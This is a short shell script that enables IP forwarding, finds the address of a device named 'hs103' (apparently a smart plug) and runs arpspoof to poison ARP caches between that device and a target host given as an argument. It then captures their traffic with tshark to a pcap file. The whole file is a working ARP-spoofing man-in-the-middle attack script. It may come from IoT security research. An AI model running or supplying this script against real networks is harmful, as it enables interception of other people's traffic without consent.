#!/bin/sh
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
sudo arp -a hs103 | (IFS="(" read first rest; echo "$rest") | (IFS=")" read plugIP rest; sudo arpspoof -i wlan0 -t $1 -r $plugIP &)
sudo arp -a hs103 | (IFS="(" read first rest; echo "$rest") | (IFS=")" read plugIP rest; tshark -i wlan0 -f "host $1 and host $plugIP" -w output.pcap)